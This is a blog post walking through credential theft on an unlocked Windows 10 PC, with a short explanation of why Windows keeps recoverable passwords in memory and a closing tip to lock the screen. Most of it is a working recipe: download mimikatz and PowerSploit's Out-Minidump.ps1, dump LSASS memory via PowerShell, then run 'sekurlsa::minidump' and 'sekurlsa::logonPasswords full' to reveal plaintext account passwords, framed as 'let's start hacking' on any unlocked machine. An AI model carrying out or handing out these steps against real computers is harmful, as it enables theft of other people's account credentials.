I found [this article](http://www.fixedbyvonnie.com/2015/02/hack-passwords-of-windows-in-5-minutes) mentioning about the existing vulnerability in Windows OS where you can get the plaintext view of your passwords on any unlocked computer. So, I tried it on my Windows 10 PC and found that the vulnerability is still exist. The method used here is not new at all, and anyone can perform this hacking on any unlocked Windows PC providing that they know how to use the following tools.



### Tools you need

- [mimikatz](https://github.com/gentilkiwi/mimikatz/releases/latest) - just get the binary package, e.g. `mimikatz_trunk.zip`
- [Out-Minidump.ps1](https://raw.github.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1) - PowerShell script

Download all the tools above and let's start hacking!



### 1. Perform memory dump using the PowerShell script

To perform the [LSASS](https://technet.microsoft.com/en-us/library/cc961760.aspx) dump, I will use the PowerShell script - `Out-Minidump.ps1`. The flow of cmdlet will look like this:

{% include figure.html src="assets/images/1lQnyhZ.png" caption="PowerShell cmdlet" %}

```powershell
. 'G:\USERFILES\Desktop\PowerShell Playground\Out-Minidump.ps1'
# "dot sourcing" method to import function from the script

Get-Process lsass | Out-Minidump
# To perform the LSASS dump

Copy-Item .\lsass_868.dmp 'G:\USERFILES\Desktop\PowerShell Playground'
# Copy the dump file to desired location
```

### 2. View the passwords using the mimikatz terminal program

As you can see, `lsass_868.dmp` is the example of LSASS dump file captured using the PowerShell script. Now, it's time I need to use the mimikatz terminal to load in the dump file as follows:

```
sekurlsa::minidump "G:\USERFILES\Desktop\PowerShell Playground\lsass_868.dmp"
```

{% include figure.html src="assets/images/OPA0g0w.png" caption="mimikatz MINIDUMP" %}

Switching to MINIDUMP file, so now I can view the passwords. Now, I will run this command to display all the accounts and passwords available:

```
sekurlsa::logonPasswords full
```

Voila! There, I can see my actual Microsoft Account username and password in _a plaintext view_.

### Explanation of the vulnerability

The fact is that the password is encrypted but it's _useless_ as the implementation depends on two basic Win32 functions; [LsaProtectMemory](https://msdn.microsoft.com/en-us/library/windows/desktop/ff714509%28v=vs.85%29.aspx) (the encryption function) and [LsaUnprotectMemory](https://msdn.microsoft.com/en-us/library/windows/desktop/ff714510(v=vs.85).aspx) (the decryption function). So, the Windows stores these encrypted user passwords in memory without using any of one-way hash algorithm which is decryptable using **LsaUnprotectMemory** function to a plain text.

**So, it is RECOMMENDED to always lock your Windows when you are away, especially when you are in office or public place. This hacking can simply be done less than five minutes!**
